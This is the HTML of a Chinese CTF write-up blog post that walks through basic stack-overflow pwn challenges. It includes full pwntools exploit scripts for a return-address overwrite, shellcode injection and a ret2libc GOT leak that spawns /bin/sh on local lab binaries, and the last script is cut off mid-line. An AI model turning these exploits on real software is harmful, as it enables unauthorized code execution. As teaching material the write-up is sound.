@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="default">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  
+  <title>PWN学习总结之基础栈溢出 | Hc1m1</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="总结下内部CTF平台中的栈溢出PWN">
+<meta name="keywords" content="CTF,PWN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN学习总结之基础栈溢出">
+<meta property="og:url" content="http://0x48.pw/2016/11/03/0x26/index.html">
+<meta property="og:site_name" content="Hc1m1">
+<meta property="og:description" content="总结下内部CTF平台中的栈溢出PWN">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/pwn00.png">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/pwn01.png">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/pwn02.png">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/pwn03.png">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/pwn04.png">
+<meta property="og:updated_time" content="2016-11-08T09:44:58.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PWN学习总结之基础栈溢出">
+<meta name="twitter:description" content="总结下内部CTF平台中的栈溢出PWN">
+<meta name="twitter:image" content="http://qn.lazysheep.cc/img/pwn00.png">
+  
+    <link rel="alternative" href="/rss.xml" title="Hc1m1" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  
+      <link href="//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css" rel="stylesheet">
+  
+  
+      <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+      <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <script src="//cdn.bootcss.com/jquery/1.9.1/jquery.min.js"></script>
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false,
+      }
+  </script>
+
+  
+      <script>
+          yiliaConfig.rootUrl = "/";
+      </script>
+  
+
+  
+      <script>
+          var _hmt = _hmt || [];
+          (function() {
+              var hm = document.createElement("script");
+              hm.src = "//hm.baidu.com/hm.js?4b6b8b9a09d24f4d4e26c50bd1707fd7";
+              var s = document.getElementsByTagName("script")[0]; 
+              s.parentNode.insertBefore(hm, s);
+          })();
+      </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  
+</head>
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Hcamael</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">Blog</p>
+        
+                
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Binary/" style="font-size: 16px;">Binary</a> <a href="/tags/CBC-Padding-Oracle-Attack/" style="font-size: 10px;">CBC Padding Oracle Attack</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 18px;">Crypto</a> <a href="/tags/GIT/" style="font-size: 10px;">GIT</a> <a href="/tags/Old博文/" style="font-size: 10px;">Old博文</a> <a href="/tags/PWN/" style="font-size: 14px;">PWN</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/Pwn/" style="font-size: 12px;">Pwn</a> <a href="/tags/Python/" style="font-size: 14px;">Python</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/Re/" style="font-size: 10px;">Re</a> <a href="/tags/SHA1-Length-Extension-Attack/" style="font-size: 10px;">SHA1 Length Extension Attack</a> <a href="/tags/SQLi/" style="font-size: 12px;">SQLi</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/Wechall/" style="font-size: 10px;">Wechall</a> <a href="/tags/php/" style="font-size: 14px;">php</a> <a href="/tags/安全研究/" style="font-size: 12px;">安全研究</a> <a href="/tags/密码学/" style="font-size: 10px;">密码学</a> <a href="/tags/检讨/" style="font-size: 10px;">检讨</a> <a href="/tags/环境搭建/" style="font-size: 10px;">环境搭建</a> <a href="/tags/网络/" style="font-size: 10px;">网络</a> <a href="/tags/随笔/" style="font-size: 10px;">随笔</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://hduisa.cn">HDUISA</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://wiki.hduisa.org">wiki</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://drops.hduisa.org">Drops</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lightless.me">lightless</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://homeway.me">夏日小草</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.edwardl.xyz">Edward_L</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://aklis.info">Aklis</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://libc.pw">Explorer</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lorexxar.cn">Lorexxar</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">HDUISA, web狗, 菜鸡H, 正在向bin爷爷努力前进</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Hcamael</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Hcamael</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">Blog</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-0x26" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/11/03/0x26/" class="article-date">
+      <time datetime="2016-11-03T00:18:51.000Z" itemprop="datePublished">2016-11-03</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      PWN学习总结之基础栈溢出
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/H-blog/">H-blog</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/">PWN</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>总结下内部CTF平台中的栈溢出PWN</p>
+<a id="more"></a>
+<p>#0x0 前言</p>
+<p>前置技能: 32/64位汇编</p>
+<p>把这篇博文的题目都丢一个docker里了, dockerfile丢到github了: <a href="https://github.com/Hcamael/docker_lib/tree/master/pwn" target="_blank" rel="external">https://github.com/Hcamael/docker_lib/tree/master/pwn</a></p>
+<p>进入到pwn目录中, build一个新镜像:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> pwn</span></div><div class="line"><span class="meta">$</span><span class="bash"> docker build -t ubuntu:stack1 .</span></div><div class="line"><span class="meta">$</span><span class="bash"> docker run --name stack1 -it <span class="_">-d</span> -P ubuntu:stack1</span></div></pre></td></tr></table></figure></p>
+<p>然后使用<br><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="title">docker</span> <span class="keyword">port</span> stack1</div></pre></td></tr></table></figure></p>
+<p>查看每题开放的端口</p>
+<p>#0x1 PWN0</p>
+<p>描述: 题目就一个pwn0的二进制文件, 这题是一个栈溢出的演示demo, 了解如何通过栈溢出控制EIP</p>
+<p>我做二进制的步骤一般都是先用binwalk， 查看二进制文件</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ binwalk pwn0</div><div class="line"><span class="section">DECIMAL       HEXADECIMAL     DESCRIPTION</span></div><div class="line">--------------------------------------------------------------------------------</div><div class="line">0             0x0             ELF, 32-bit LSB executable, Intel 80386, version 1 (SYSV)</div><div class="line">1746          0x6D2           Unix path: /home/pwn/pwn0/flag</div></pre></td></tr></table></figure>
+<p>从binwalk中得知这是一个32位的二进制文件, 然后丢到32位的IDA中</p>
+<p>简单来看可以直接用F5, 也可以直接看汇编, 锻炼一下自己.</p>
+<p>很容易能找到一个<code>getFlag</code>函数<br><img src="http://qn.lazysheep.cc/img/pwn00.png" alt="pwn00"></p>
+<p>只要能调用该函数, 那么就可以得到flag</p>
+<p>还有两个函数<code>foo</code>和<code>main</code></p>
+<p><img src="http://qn.lazysheep.cc/img/pwn01.png" alt="pwn01"><br><img src="http://qn.lazysheep.cc/img/pwn02.png" alt="pwn02"></p>
+<p>代码很简单, 正常情况下是不可能调用到<code>getFlag</code>函数的, 这时候就需要想其他方法.</p>
+<p>看<code>foo</code>函数中, 调用<code>gets</code>函数之前的汇编, 我们能得到如下的栈结构:</p>
+<p><img src="http://qn.lazysheep.cc/img/pwn03.png" alt="pwn03"></p>
+<p><code>gets</code>函数得到的输入存在<code>eax</code>指向的地址, 因为<code>gets</code>函数没有限制输入的长度, 如果获取输入的字符串大于0x1c byte, 则会覆盖到<code>ebp</code>以下的栈数据, <code>ret</code>表示函数执行结束后的返回地址, 如果<code>foo</code>函数执行结束, <code>eip</code>就会跳向这个地址, 所以我们可以通过把<code>ret</code>的值改为<code>getFlag</code>函数的地址, 调用<code>getFlag</code>函数.</p>
+<p>通过gdb进行调试, 可以很容易理解该原理.</p>
+<p>当输入<code>32 * &#39;a&#39; + &#39;b&#39; * 4</code>时:<br><img src="http://qn.lazysheep.cc/img/pwn04.png" alt="pwn04"></p>
+<p>payload0.py<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"> </div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"> </div><div class="line">conn = remote(<span class="string">'127.0.0.1'</span>, <span class="number">10001</span>)</div><div class="line">pwn_elf = ELF(<span class="string">'pwn0'</span>)</div><div class="line"><span class="built_in">print</span> conn.recvline()</div><div class="line">payload = <span class="string">"a"</span> * <span class="number">0x1c</span> + <span class="string">"a"</span> * <span class="number">4</span>             <span class="comment"># 0x1c长度的buf + 4 byte的ebp</span></div><div class="line">payload += p32(pwn_elf.symbols[<span class="string">'getFlag'</span>]) <span class="comment"># 覆盖ret</span></div><div class="line">conn.sendline(payload)</div><div class="line"><span class="built_in">print</span> conn.recv()</div><div class="line"><span class="built_in">print</span> conn.recv()</div></pre></td></tr></table></figure></p>
+<p>不过这是下一题的解法, 在<code>foo</code>函数中不是还有一个条件语句调用<code>getFlag</code>函数么， 只要让该判断成立, 就好了, 上面的理解了, 现在说的这种方法就一目了然了, 用于判断的变量a1， 为函数实参, 在栈中位于ret之下, 所以只要输入<code>(32 + 4 + 4) * &#39;a&#39;</code>覆盖该参数, 则可使判断成立</p>
+<h1 id="0x2-PWN1"><a href="#0x2-PWN1" class="headerlink" title="0x2 PWN1"></a>0x2 PWN1</h1><p>使用上面所说的方法, 控制eip跳转到<code>getFlag</code>函数</p>
+<h1 id="0x3-PWN2"><a href="#0x3-PWN2" class="headerlink" title="0x3 PWN2"></a>0x3 PWN2</h1><p>描述: 古老的栈溢出, 用shellcode就好了</p>
+<p>同样是使用binwalk, 判断出是32位程序, 丢到ida中</p>
+<p>本题主要是<code>foo</code>函数:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ssize_t</span> foo()</div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+Ch] [bp-1Ch]@1</span></div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"0x%x\n"</span>, &amp;buf);</div><div class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>从汇编代码中我们能看出<code>buf</code>的长度为<code>0x1c</code>, 但是read函数却可以最大读取<code>0x100</code>比特的字符串, 很明显会导致溢出漏洞</p>
+<p>这里推荐一个神器: <a href="https://github.com/longld/peda" target="_blank" rel="external">peda</a></p>
+<p>peda为gdb插件</p>
+<p>peda有一个checksec命令, 可以检测二进制的保护机制是否开启<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ gdb pwn2</div><div class="line">gdb-peda$ checksec</div><div class="line">CANARY    : <span class="type">disabled</span></div><div class="line">FORTIFY   : <span class="type">disabled</span></div><div class="line">NX        : <span class="type">disabled</span></div><div class="line">PIE       : <span class="type">disabled</span></div><div class="line">RELRO     : <span class="type">Partial</span></div></pre></td></tr></table></figure></p>
+<p>其中NX, 表示堆栈不可执行的保护, 状态为disabled, 表示堆栈不可执行关闭, 也就是说eip可以跳到堆栈地址</p>
+<p>这时候我们可以使用shellcode, 啥为shellcode? 比如一段C代码<code>system(&#39;/bin/sh&#39;);</code>, 把其转为汇编再转为二进制形式就是shellcode</p>
+<p>我们可以把shellcode储存在<code>buf</code>变量中, 然后通过溢出, 控制eip跳转到<code>buf</code>的地址, 我们就可以执行shellcode了, 可以想象成是执行<code>system(&#39;/bin/sh&#39;);</code></p>
+<p>在<code>foo</code>函数中一开始就输出<code>buf</code>变量的地址了, 所以也挺简单的</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">shell_code = shellcraft.i386.sh()    <span class="comment"># pwntools生成shellcode的汇编代码</span></div><div class="line">shell_code = asm(shell_code)         <span class="comment"># 把汇编代码进行汇编生成二进制</span></div><div class="line">conn = remote('127.0.0.1', 10003)</div><div class="line">addr = conn.recvline()</div><div class="line">add = int(addr[2:],16)               <span class="comment"># 获取buf地址</span></div><div class="line">shellcode_add = p32(add + 32 + 4)    <span class="comment"># 计算出shellcode地址, 然后转换成二进制字符串</span></div><div class="line">v = 32*<span class="string">"a"</span> + shellcode_add + shell_code  <span class="comment"># 0x1c的buf + 4 byte的ebp + 4 byte的shellcode地址 + shellcode</span></div><div class="line">conn.send(v+<span class="string">"\n"</span>)</div><div class="line">conn.interactive()</div></pre></td></tr></table></figure>
+<h1 id="0x4-PWN3"><a href="#0x4-PWN3" class="headerlink" title="0x4 PWN3"></a>0x4 PWN3</h1><p>描述: 如果服务开了NX, 应该怎么拿shell呢?</p>
+<p>该题给了一个二进制文件和该二进制文件依赖的libc库</p>
+<p>使用binwalk， 可知是32位程序, 使用checksec, 可知开启了NX保护, 表示堆栈不可执行, 所以无法像上一题一样控制eip跳到栈地址了.</p>
+<p>先丢ida</p>
+<p>跟上一题差不多的代码, 同样buf大小为<code>0x1c</code></p>
+<p>所以通过溢出控制eip很简单, (只要前面的理解清楚了)现在的问题是, 控制了eip后可以干什么? 首先考虑, 做这题我们的目的是啥, 原题是flag位于<code>/home/pwn/pwn3/flag</code>路径下, 要读取该文件就需要能执行shell命令, 我复现的环境里没放进flag， 所以最终目是能getshell就好了.</p>
+<p>我们的目的是getshell, 那么只要能执行<code>system(&#39;/bin/sh&#39;)</code>类似的命令就能达成我们的目的, 执行类似命令我们还缺少一个条件, <code>system</code>函数的地址, 如果我们能获取到该地址, 那么很容易就能getshell了, 只要发送<code>32 * &#39;a&#39; + system_addr + ret_address + &#39;/bin/sh&#39;</code></p>
+<p>首先是发送32 byte的padding把0x1c的buf和4 byte的ebp给填满, 然后是system_addr地址覆盖ret的地址, 控制eip跳转到system_addr地址, 然后就是system函数执行结束后的放回地址, 然后是system函数的参数<code>/bin/sh</code></p>
+<p>所以现在我们的问题就是, 如何获取system函数地址, 在pwn3的二进制文件中, 无法找到system函数</p>
+<p>C语言写的程序, 在正常情况下, 程序都会加载一个叫libc的动态链接库, 在代码中你不需要<code>#include</code>外部库就能调用的函数, 比如<code>write</code>, <code>read</code>, <code>system</code>, 这些函数就来自这个libc库, 使用<code>ldd</code>可以查看一个二进制文件的动态链接库的情况<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ ldd pwn3</div><div class="line">	linux-gate.so.<span class="number">1</span> =&gt;  (<span class="number">0xf77f7000</span>)</div><div class="line">	libc.so.<span class="number">6</span> =&gt; <span class="regexp">/lib32/libc</span>.so.<span class="number">6</span> (<span class="number">0xf7623000</span>)</div><div class="line">	/<span class="class"><span class="keyword">lib</span>/<span class="title">ld</span>-<span class="title">linux</span>.<span class="title">so</span>.2 (0<span class="title">x5662b000</span>)</span></div></pre></td></tr></table></figure></p>
+<p>在运行pwn3的时候libc库也会被动态的加载到内存中去, libc中含有system函数, 所以内存中也会有system函数, 所以现在的问题是如何去寻找内存中system函数的地址</p>
+<p>这时候涉及到另一个知识点, 在一个二进制文件中, 有一个plt表和一个got表的东西, 你的程序调用的函数除了自己写的函数外, 都会出现在这两个表中, 你可以想象成是外部调用函数表.</p>
+<p>仔细看汇编代码你会发现, 外部函数的调用都是call该函数plt表的地址, 涉及到这样一种机制:</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">第一次<span class="function"><span class="title">call</span> write -&gt;</span> <span class="function"><span class="title">write_plt</span> -&gt;</span> 系统初始化去获取<span class="function"><span class="title">write</span>在内存中的地址 -&gt;</span> 写到<span class="function"><span class="title">write_got</span> -&gt;</span> write_plt变成jmp *write_got</div></pre></td></tr></table></figure>
+<p>还要能理解一种关系:<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">write_addr -<span class="keyword"> system</span>_addr == write_addr_libc -<span class="keyword"> system</span>_addr_libc</div></pre></td></tr></table></figure></p>
+<p>也就是, system函数和其他函数地址的差值, 不管是加载到内存中还是在libc的二进制中, 都是相等的</p>
+<p>根据上面这些姿势, 如果我们获取到了<code>write_got</code>的值(write函数加载到内存中的地址), 因为我们有libc库, 所以可以很容易去计算system函数和write函数的差值, 用<code>write_got</code>地址减去这个差值, 也就是system函数加载到内存中的地址了</p>
+<p>payload:<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line">from pwn import *</div><div class="line">context.log_level = <span class="string">"debug"</span></div><div class="line"></div><div class="line">p = remote(<span class="string">"127.0.0.1"</span>, 10003)</div><div class="line">e = ELF('libc.so.6')</div><div class="line">pwn3 = ELF('pwn3')</div><div class="line"></div><div class="line">payload1 =  <span class="string">"a"</span>*32									<span class="comment"># 32 byte的padding</span></div><div class="line">payload1 += p32(pwn3.symbols['write'])				<span class="comment"># 控制eip跳转到write函数</span></div><div class="line">payload1 += p32(pwn3.symbols['foo'])				<span class="comment"># 调用完write后的返回地址</span></div><div class="line">payload1 += p32(1) + p32(pwn3.got['write']) + p32(4)<span class="comment"># write函数的三个参数: write(1, write_got, 4) </span></div><div class="line"></div><div class="line">p.sendline(payload1)</div><div class="line">p.recv()</div><div class="line">a = p.recv()</div><div class="line"></div><div class="line">write_addr = u32(a[-4:])		<span class="comment"># write 在内存中的值</span></div><div class="line">write_system_addr = e.symbols['write'] - e.symbols['system']  <span class="comment"># write函数和sytem函数地址的差值</span></div><div class="line">write_shell_addr = e.symbols['write'] - e.search('/bin/sh').next() <span class="comment"># write函数和/bin/sh字符串地址的差值</span></div><div class="line"></div><div class="line">sys_add = p32(write_addr - write_system_addr)	<span class="comment"># 通过差值计算出system函数在内存中的地址</span></div><div class="line">shell_add = p32(write_addr - write_shell_addr)  <span class="comment"># 计算出/bin/sh字符串的地址</span></div><div class="line">ret_addr  = '\x12\x12\x12\x12'					<span class="comment"># 调用system函数后的返回地址, 这里随便填</span></div><div class="line">payload = <span class="string">"a"</span> * 32 + sys_add + ret_addr + shell_add <span class="comment"># 调用system('/bin/sh')</span></div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<h1 id="0x5-PWN4"><a href="#0x5-PWN4" class="headerlink" title="0x5 PWN4"></a>0x5 PWN4</h1><p>描述: 给了一个二进制文件和libc库, CTF中正常情况下低分的PWN题, 因为栈溢出的利用相对比较简单, 所以相关的题分数相对比较低, 正常情况下CTF的pwn题不会像前面那样那么容易就让你发现溢出点</p>
+<p>pwn4首先看是32位程序, 然后丢到ida中去, 该程序有两个主要的函数<code>sub_8048800</code>和<code>sub_8048720</code>:</p>
+<blockquote>
+<p>sub_8048720: 获取输入的函数, 根据<code>\x0a</code>来判断是否结尾, 会在输入的字符串结尾加上<code>\x00</code>, 没有输入的长度限制, 输入存在堆中, 会根据输入的长度动态扩展堆, 没发现漏洞, 认为无法溢出</p>
+<p>sub_8048800: 通过strlen判断输入的字符串长度, 必须大于7小于0x80, 开头7byte必须是<code>http://</code>,初始化了一个0x80大小的栈, 然后是根据是否有%符号, 如果不是%符号, 则把堆上的字符copy到栈上去, 如果遇到%, 则把之后两个byte当成十六进制, 然后转成字符串copy到栈上去, 遇到\x00则结束copy, 比如堆上的数据是<code>http://%41</code>, 则copy到栈上之后的结果是<code>http://A</code>, 其实就是一个urldecode的代码</p>
+</blockquote>
+<p>粗看之下并没有发现有溢出点, 但是仔细分析下, 这两个函数结合起来有一个算是逻辑方面的漏洞吧.</p>
+<p><code>sub_8048720</code>是根据<code>\x0a</code>来判断结尾, 而<code>strlen</code>函数是根据<code>\x00</code>来判断字符串长度, 也就是说, 我输入<code>http://\x00aaaaaaaaaaaaaa\x0a</code>, 使用strlen来判断长度, 其长度为7.</p>
+<p>但是还有一个问题, <code>sub_8048800</code>中也是根据<code>\x00</code>来判断copy的结尾, 但是却存在一个逻辑漏洞, 如果当前byte是%, 则把后面两byte根据十六进制ascii转成字符, 然后指针向后移两位:</p>
+<p>所以说, 如果我的<code>\x00</code>藏在%号之后, 就不会遇到copy结束的判断, 从而导致栈溢出</p>
+<p>栈溢出证明: <code>&#39;http://\x00&#39; + &#39;a&#39;*0x100</code></p>
+<p>然后是本题的payload:<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">pwn4 = ELF('pwn4')</div><div class="line">libc = ELF('libc.so.6')</div><div class="line"></div><div class="line">padding = <span class="string">"http://%\x00"</span> + 'a' * (156 - 9 + 2)    <span class="comment"># 加2是因为出现了%, 指针偏移了两位</span></div><div class="line"></div><div class="line">p = remote(<span class="string">"127.0.0.1"</span>, 10004)</div><div class="line"></div><div class="line">get_write_addr_payload = padding + p32(pwn4.symbols['puts']) + p32(0x8048590) + p32(pwn4.got['puts']) <span class="comment"># puts(puts_got) 然后调回到main函数</span></div><div class="line"><span class="section">p.readuntil('URL: ')</span></div><div class="line">p.sendline(get_write_addr_payload)</div><div class="line"><span class="section">p.readuntil("http://\n")</span></div><div class="line">puts_addr = u32(p.recv()[:4])   <span class="comment"># puts_got</span></div><div class="line"></div><div class="line"><span class="comment"># 之后就是栈溢出知道libc库的套路, 跟pwn3一样</span></div><div class="line">puts_system_addr = libc.symbols['puts'] - libc.symbols['system']</div><div class="line">puts_binsh_addr = libc.symbols['puts'] - libc.search('/bin/sh').next()</div><div class="line"></div><div class="line">system_addr = puts_addr - puts_system_addr</div><div class="line">binsh_addr = puts_addr - 